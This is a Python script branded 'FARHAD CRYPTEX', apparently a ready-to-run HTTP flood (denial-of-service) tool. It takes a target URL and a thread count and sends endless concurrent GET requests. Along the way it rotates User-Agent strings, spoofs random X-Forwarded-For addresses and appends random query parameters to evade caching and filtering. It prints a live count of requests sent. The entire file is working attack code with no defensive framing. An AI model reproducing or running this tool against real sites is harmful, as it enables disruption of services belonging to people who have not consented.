import os
import sys
import time
import random
import string
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, init

init(autoreset=True)
os.system('cls' if os.name == 'nt' else 'clear')

print(Fore.CYAN + '''
███████╗ █████╗ ██████╗ ██╗  ██╗ █████╗ ██████╗     ██████╗██████╗ ██╗   ██╗██████╗ ███████╗██╗  ██╗
██╔════╝██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██║   ██║██╔══██╗██╔════╝██║ ██╔╝
█████╗  ███████║██████╔╝█████╔╝ ███████║██║  ██║    ██║     ██████╔╝██║   ██║██████╔╝█████╗  █████╔╝ 
██╔══╝  ██╔══██║██╔═══╝ ██╔═██╗ ██╔══██║██║  ██║    ██║     ██╔═══╝ ██║   ██║██╔═══╝ ██╔══╝  ██╔═██╗ 
██║     ██║  ██║██║     ██║  ██╗██║  ██║██████╔╝    ╚██████╗██║     ╚██████╔╝██║     ███████╗██║  ██╗
╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝      ╚═════╝╚═╝      ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝

         FARHAD CRYPTEX - HIGH-PERFORMANCE FLOOD TOOL
''')

if len(sys.argv) < 3:
    print(Fore.YELLOW + "Usage: python3 FarHadCrypteX.py <url> <threads>")
    sys.exit()

url = sys.argv[1]
threads = int(sys.argv[2])

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)"
]

session = requests.Session()
adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=1000)
session.mount('http://', adapter)
session.mount('https://', adapter)

success = 0
failed = 0
start_time = time.time()

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def send_request():
    global success, failed
    try:
        headers = {
            'User-Agent': random.choice(user_agents),
            'X-Forwarded-For': '.'.join(str(random.randint(0,255)) for _ in range(4))
        }
        params = {random_string(): random_string() for _ in range(3)}
        response = session.get(url, headers=headers, params=params, timeout=3, stream=True)
        if response.status_code < 500:
            success += 1
        else:
            failed += 1
    except:
        failed += 1

def stats():
    while True:
        time.sleep(5)
        uptime = int(time.time() - start_time)
        print(Fore.GREEN + f"[+] Sent: {success} | [-] Failed: {failed} | Uptime: {uptime}s")

print(Fore.CYAN + f"[!] Launching high-performance flood on {url} with {threads} workers\n")

import threading
threading.Thread(target=stats, daemon=True).start()

try:
    with ThreadPoolExecutor(max_workers=threads) as executor:
        while True:
            futures = [executor.submit(send_request) for _ in range(threads)]
            for f in as_completed(futures):
                pass  # Just to cycle tasks continuously
except KeyboardInterrupt:
    print(Fore.YELLOW + "\n[!] Stopped by user. Exiting gracefully...")
    sys.exit()